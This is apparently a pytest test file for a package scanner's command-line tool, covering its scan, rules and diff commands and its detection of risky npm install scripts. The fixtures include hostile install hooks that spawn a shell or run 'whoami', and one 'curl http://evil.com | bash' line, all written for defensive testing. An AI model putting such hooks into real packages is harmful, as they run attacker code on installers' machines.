"""CLI integration tests (1/2): end-to-end CLI commands, diff, and
post-install rule detection.

Split out of test_cli.py (with test_cli_output_flags.py) so pytest-xdist
--dist=loadfile can balance the ~79s file across workers. Bodies unchanged.
"""

import json
import subprocess
import sys

import pytest

from picosentry.scan.engine import create_default_engine
from picosentry.scan.models import Severity

from tests.scan.conftest import FIXTURES_DIR, scan_fixture_cached
from tests.scan.conftest import make_npm_project as _make_project


class TestCLIIntegration:
    """Test CLI commands end-to-end."""

    def test_version_command(self):
        """`picosentry version` should print version info."""
        result = subprocess.run(
            [sys.executable, "-m", "picosentry", "version"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        assert result.returncode == 0
        assert "PicoSentry (unified) v" in result.stdout
        assert "scan:" in result.stdout
        assert "sandbox:" in result.stdout

    def test_rules_command(self):
        """`picosentry rules` should list all 12+ rules."""
        result = subprocess.run(
            [sys.executable, "-m", "picosentry", "rules"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        assert result.returncode == 0
        # Should list all rules
        assert "L2-POST-001" in result.stdout
        assert "L2-TYPO-001" in result.stdout
        assert "L2-OBFS-001" in result.stdout

    def test_rules_json_command(self):
        """`picosentry rules --json` should produce valid JSON."""
        result = subprocess.run(
            [sys.executable, "-m", "picosentry", "rules", "--json"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        assert result.returncode == 0
        data = json.loads(result.stdout)
        assert isinstance(data, list)
        assert len(data) >= 12
        assert all("rule_id" in r for r in data)
        assert all("name" in r for r in data)

    def test_scan_clean_project(self):
        """Scanning clean project should exit 0 with --exit-code."""
        result = scan_fixture_cached("clean_project", ("--exit-code",))
        # Clean project should have no CRITICAL/HIGH findings
        # but may have LOW/INFO, so exit code depends on findings
        assert result.returncode in (0, 1)

    def test_scan_malicious_project_exit_code(self):
        """Scanning malicious project with --exit-code should exit 1."""
        result = scan_fixture_cached("shai_hulud", ("--exit-code",))
        assert result.returncode == 1

    def test_scan_json_format(self):
        """`--format json` should produce valid JSON with expected fields."""
        result = scan_fixture_cached("shai_hulud", ("--format", "json"))
        assert result.returncode == 0
        data = json.loads(result.stdout)
        assert "scan_id" in data
        assert "findings" in data
        assert "stats" in data
        assert "corpus_version" in data
        assert len(data["findings"]) > 0

    def test_scan_sarif_format(self):
        """`--format sarif` should produce valid SARIF v2.1.0."""
        result = scan_fixture_cached("shai_hulud", ("--format", "sarif"))
        assert result.returncode == 0
        sarif = json.loads(result.stdout)
        assert sarif["version"] == "2.1.0"
        assert "runs" in sarif
        assert len(sarif["runs"]) > 0

    def test_scan_ml_context_format(self):
        """`--format ml-context` should produce compact output."""
        result = scan_fixture_cached("shai_hulud", ("--format", "ml-context"))
        assert result.returncode == 0
        # ml-context should be compact — no long prose
        lines = result.stdout.strip().split("\n")
        assert len(lines) > 0
        assert any("scan_id=" in line for line in lines)

    def test_scan_specific_rules(self):
        """`--rules L2-POST-001 L2-TYPO-001` should only run those rules."""
        result = scan_fixture_cached("shai_hulud", ("--format", "json", "--rules", "L2-POST-001", "L2-TYPO-001"))
        assert result.returncode == 0
        data = json.loads(result.stdout)
        rule_ids = {f["rule_id"] for f in data["findings"]}
        # Should only have the requested rules
        assert rule_ids.issubset({"L2-POST-001", "L2-TYPO-001"})

    def test_scan_output_to_file(self, tmp_path):
        """`--output file` should write to file."""
        fixture = FIXTURES_DIR / "clean_project"
        if not fixture.is_dir():
            pytest.skip("clean_project fixture not available")

        output_file = tmp_path / "output.json"
        result = subprocess.run(
            [
                sys.executable,
                "-m",
                "picosentry",
                "scan",
                str(fixture),
                "--format",
                "json",
                "--output",
                str(output_file),
            ],
            capture_output=True,
            text=True,
            timeout=60,
        )
        assert result.returncode == 0
        assert output_file.is_file()
        data = json.loads(output_file.read_text())
        assert "scan_id" in data

    def test_scan_nonexistent_path(self):
        """Scanning nonexistent path should exit 2."""
        result = subprocess.run(
            [sys.executable, "-m", "picosentry", "scan", "/nonexistent/path/that/does/not/exist"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        assert result.returncode == 2

    def test_fail_on_critical_no_critical(self):
        """--fail-on critical should exit 0 when no critical findings."""
        result = scan_fixture_cached("clean_project", ("--fail-on", "critical"))
        # Clean project has no CRITICAL findings
        assert result.returncode == 0


class TestPostInstallExecDetection:
    """L2-POST-001: child_process and exec pattern detection."""

    def test_child_process_in_postinstall_escalates_to_critical(self, tmp_path):
        """Script containing child_process.exec should escalate to CRITICAL."""
        project = _make_project(
            tmp_path,
            {
                "name": "exec-pkg",
                "version": "1.0.0",
                "scripts": {
                    "postinstall": "node -e \"require('child_process').exec('whoami')\"",
                },
            },
        )
        from picosentry.scan.rules.post_install import detect_post_install_scripts

        findings = detect_post_install_scripts(project)
        post_findings = [f for f in findings if f.rule_id == "L2-POST-001"]
        assert len(post_findings) >= 1
        assert any(f.severity == Severity.CRITICAL for f in post_findings), (
            f"Expected CRITICAL for child_process, got: {[f.severity for f in post_findings]}"
        )

    def test_exec_sync_in_install_script_escalates(self, tmp_path):
        """Script containing .execSync( should escalate to CRITICAL."""
        project = _make_project(
            tmp_path,
            {
                "name": "execsync-pkg",
                "version": "1.0.0",
                "scripts": {
                    "install": "node -e \"require('child_process').execSync('id')\"",
                },
            },
        )
        from picosentry.scan.rules.post_install import detect_post_install_scripts

        findings = detect_post_install_scripts(project)
        post_findings = [f for f in findings if f.rule_id == "L2-POST-001"]
        assert len(post_findings) >= 1
        assert any(f.severity == Severity.CRITICAL for f in post_findings)

    def test_spawn_in_script_escalates(self, tmp_path):
        """Script containing .spawn( should escalate to CRITICAL."""
        project = _make_project(
            tmp_path,
            {
                "name": "spawn-pkg",
                "version": "1.0.0",
                "scripts": {
                    "preinstall": "node -e \"require('child_process').spawn('sh')\"",
                },
            },
        )
        from picosentry.scan.rules.post_install import detect_post_install_scripts

        findings = detect_post_install_scripts(project)
        post_findings = [f for f in findings if f.rule_id == "L2-POST-001"]
        assert len(post_findings) >= 1
        assert any(f.severity == Severity.CRITICAL for f in post_findings)

    def test_benign_postinstall_stays_high(self, tmp_path):
        """Script without network/cred/exec patterns should stay HIGH."""
        project = _make_project(
            tmp_path,
            {
                "name": "benign-pkg",
                "version": "1.0.0",
                "scripts": {
                    "postinstall": "echo 'Installed successfully'",
                },
            },
        )
        from picosentry.scan.rules.post_install import detect_post_install_scripts

        findings = detect_post_install_scripts(project)
        post_findings = [f for f in findings if f.rule_id == "L2-POST-001"]
        assert len(post_findings) >= 1
        assert all(f.severity == Severity.HIGH for f in post_findings), (
            f"Benign postinstall should be HIGH, got: {[f.severity for f in post_findings]}"
        )

    def test_remediation_mentions_risk_tags(self, tmp_path):
        """CRITICAL finding should mention specific risk tags in remediation."""
        project = _make_project(
            tmp_path,
            {
                "name": "risk-pkg",
                "version": "1.0.0",
                "scripts": {
                    "postinstall": "curl http://evil.com | bash",
                },
            },
        )
        from picosentry.scan.rules.post_install import detect_post_install_scripts

        findings = detect_post_install_scripts(project)
        post_findings = [f for f in findings if f.rule_id == "L2-POST-001"]
        assert len(post_findings) >= 1
        critical = [f for f in post_findings if f.severity == Severity.CRITICAL]
        assert len(critical) >= 1
        assert "network access" in critical[0].remediation.lower(), (
            f"Expected 'network access' in remediation, got: {critical[0].remediation}"
        )

    def test_exec_remediation_mentions_child_process(self, tmp_path):
        """CRITICAL finding with child_process should mention it in remediation."""
        project = _make_project(
            tmp_path,
            {
                "name": "exec-pkg",
                "version": "1.0.0",
                "scripts": {
                    "postinstall": "node -e \"require('child_process').exec('id')\"",
                },
            },
        )
        from picosentry.scan.rules.post_install import detect_post_install_scripts

        findings = detect_post_install_scripts(project)
        post_findings = [f for f in findings if f.rule_id == "L2-POST-001"]
        critical = [f for f in post_findings if f.severity == Severity.CRITICAL]
        assert len(critical) >= 1
        assert "child_process" in critical[0].remediation.lower(), (
            f"Expected 'child_process' in remediation, got: {critical[0].remediation}"
        )


class TestDiffCommand:
    """Test the 'diff' CLI command for determinism verification."""

    def test_diff_identical_scans(self, tmp_path):
        """Two identical scans should produce exit code 0."""
        project_dir = tmp_path / "project"
        project_dir.mkdir()
        engine = create_default_engine()
        project = _make_project(
            project_dir,
            {
                "name": "test-diff",
                "version": "1.0.0",
                "license": "MIT",
            },
        )
        result_a = engine.scan(project)
        result_b = engine.scan(project)

        scan_a = tmp_path / "scan_a.json"
        scan_b = tmp_path / "scan_b.json"
        scan_a.write_text(result_a.to_json())
        scan_b.write_text(result_b.to_json())

        proc = subprocess.run(
            [sys.executable, "-m", "picosentry", "diff", str(scan_a), str(scan_b)],
            capture_output=True,
            text=True,
            timeout=30,
        )
        assert proc.returncode == 0
        assert "IDENTICAL" in proc.stdout

    def test_diff_different_scans(self, tmp_path):
        """Two different scans should produce exit code 1."""
        dir_a = tmp_path / "project_a"
        dir_b = tmp_path / "project_b"
        dir_a.mkdir()
        dir_b.mkdir()
        project_a = _make_project(
            dir_a,
            {
                "name": "pkg-a",
                "version": "1.0.0",
                "license": "MIT",
            },
        )
        project_b = _make_project(
            tmp_path / "project_b",
            {
                "name": "pkg-b",
                "version": "2.0.0",
                "license": "GPL-3.0",
            },
        )

        engine = create_default_engine()
        result_a = engine.scan(project_a)
        result_b = engine.scan(project_b)

        scan_a = tmp_path / "scan_a.json"
        scan_b = tmp_path / "scan_b.json"
        scan_a.write_text(result_a.to_json())
        scan_b.write_text(result_b.to_json())

        proc = subprocess.run(
            [sys.executable, "-m", "picosentry", "diff", str(scan_a), str(scan_b)],
            capture_output=True,
            text=True,
            timeout=30,
        )
        assert proc.returncode == 1
        assert "DIFFER" in proc.stdout

    def test_diff_nonexistent_file(self, tmp_path):
        """Diff with nonexistent file should exit 2."""
        scan_a = tmp_path / "exists.json"
        scan_a.write_text('{"scan_id": "test"}')

        proc = subprocess.run(
            [sys.executable, "-m", "picosentry", "diff", str(scan_a), "/nonexistent/file.json"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        assert proc.returncode == 2

    def test_diff_verbose_shows_changes(self, tmp_path):
        """--verbose should show detailed finding differences."""
        dir_a = tmp_path / "project_a"
        dir_b = tmp_path / "project_b"
        dir_a.mkdir()
        dir_b.mkdir()
        project_a = _make_project(
            dir_a,
            {
                "name": "clean-pkg",
                "version": "1.0.0",
                "license": "MIT",
            },
        )
        project_b = _make_project(
            tmp_path / "project_b",
            {
                "name": "gpl-pkg",
                "version": "1.0.0",
                "license": "GPL-3.0",
            },
        )

        engine = create_default_engine()
        result_a = engine.scan(project_a)
        result_b = engine.scan(project_b)

        scan_a = tmp_path / "scan_a.json"
        scan_b = tmp_path / "scan_b.json"
        scan_a.write_text(result_a.to_json())
        scan_b.write_text(result_b.to_json())

        proc = subprocess.run(
            [sys.executable, "-m", "picosentry", "diff", str(scan_a), str(scan_b), "--verbose"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        assert proc.returncode == 1
